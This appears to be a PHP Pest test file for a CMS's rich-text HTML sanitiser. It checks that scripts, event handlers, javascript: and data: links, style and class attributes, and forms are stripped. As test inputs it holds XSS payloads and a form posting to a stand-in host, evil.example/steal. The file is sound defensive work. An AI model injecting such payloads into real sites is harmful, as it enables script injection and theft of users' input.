<?php

use App\Support\RichTextSanitiser;

it('strips a script tag', function () {
    $dirty = '<p>Hello</p><script>alert(1)</script>';

    expect(RichTextSanitiser::sanitise($dirty))->not->toContain('script')
        ->and(RichTextSanitiser::sanitise($dirty))->toContain('Hello');
});

it('strips an inline event handler', function () {
    $dirty = '<p onclick="alert(1)">Hello</p>';

    expect(RichTextSanitiser::sanitise($dirty))->not->toContain('onclick');
});

it('strips a javascript href but keeps the link text', function () {
    $dirty = '<a href="javascript:alert(1)">Click</a>';
    $clean = RichTextSanitiser::sanitise($dirty);

    expect($clean)->not->toContain('javascript:')
        ->and($clean)->toContain('Click');
});

it('strips a data href but keeps the link text', function () {
    $dirty = '<a href="data:text/html,alert(1)">Click</a>';
    $clean = RichTextSanitiser::sanitise($dirty);

    expect($clean)->not->toContain('data:')
        ->and($clean)->toContain('Click');
});

it('strips a style attribute', function () {
    $dirty = '<p style="display:none">Hello</p>';
    $clean = RichTextSanitiser::sanitise($dirty);

    expect($clean)->not->toContain('style')
        ->and($clean)->toContain('Hello');
});

it('strips a form and its input', function () {
    $dirty = '<form action="https://evil.example/steal"><input type="text" name="x"></form>';
    $clean = RichTextSanitiser::sanitise($dirty);

    expect($clean)->not->toContain('<form')
        ->and($clean)->not->toContain('<input');
});

it('keeps legitimate formatting and links', function () {
    $clean = RichTextSanitiser::sanitise(
        '<h3>Waste</h3><p><strong>Bold</strong> and <em>italic</em></p>'
        .'<ul><li>One</li></ul><a href="/waste-and-recycling">Local</a>'
        .'<a href="https://gov.nu">External</a>'
    );

    expect($clean)->toContain('<h3>')
        ->and($clean)->toContain('<strong>')
        ->and($clean)->toContain('<li>')
        ->and($clean)->toContain('/waste-and-recycling')
        ->and($clean)->toContain('https://gov.nu');
});

it('unwraps h1 and h2 in body content but keeps their words, and leaves h3 untouched', function () {
    // <h1> is the page title and <h2> is a block's own heading — both are
    // reserved outside the rich-text body (see rich-text.blade.php). A
    // heading pasted into body content (e.g. from Word) must not silently
    // become a real <h1>/<h2> in the page's heading structure, but the
    // editor's words must survive so there's a visible signal to reformat.
    $clean = RichTextSanitiser::sanitise('<h1>Big</h1><h2>Medium</h2><h3>Small</h3>');

    expect($clean)->not->toContain('<h1>')
        ->and($clean)->not->toContain('<h2>')
        ->and($clean)->toContain('Big')
        ->and($clean)->toContain('Medium')
        ->and($clean)->toContain('<h3>Small</h3>');
});

/*
 * Spec section 6: the allowlist "strips every attribute except `href` on
 * links". A surviving `class` is not cosmetic -- `hidden` is compiled into
 * the stylesheet (the header uses `hidden lg:flex`), so an editor could make
 * a legal notice invisible on the rendered page while it still reads as
 * present in the CMS, and a positioned `fixed inset-0 z-50` block could
 * cover the page. The `prose` wrapper does all the styling the block set
 * needs; no editor-supplied class is required by any partial under
 * resources/views/components/blocks/ or by any seeded content.
 */
it('strips a class attribute but keeps the element and its text', function () {
    $clean = RichTextSanitiser::sanitise('<p class="hidden">Legal notice</p>');

    expect($clean)->not->toContain('class')
        ->and($clean)->not->toContain('hidden')
        ->and($clean)->toContain('<p>')
        ->and($clean)->toContain('Legal notice');
});

it('strips layout-breaking classes from a block element', function () {
    $clean = RichTextSanitiser::sanitise('<div class="fixed inset-0 z-50 bg-white">Overlay</div>');

    expect($clean)->not->toContain('class')
        ->and($clean)->not->toContain('fixed')
        ->and($clean)->toContain('Overlay');
});

it('keeps href on a link -- the one attribute the allowlist permits', function () {
    // Guards the fix from over-reaching: dropping allowAttribute('class')
    // must not take href with it.
    expect(RichTextSanitiser::sanitise('<a href="/waste-and-recycling">Local</a>'))
        ->toContain('href="/waste-and-recycling"');
});

it('returns null unchanged', function () {
    expect(RichTextSanitiser::sanitise(null))->toBeNull();
});
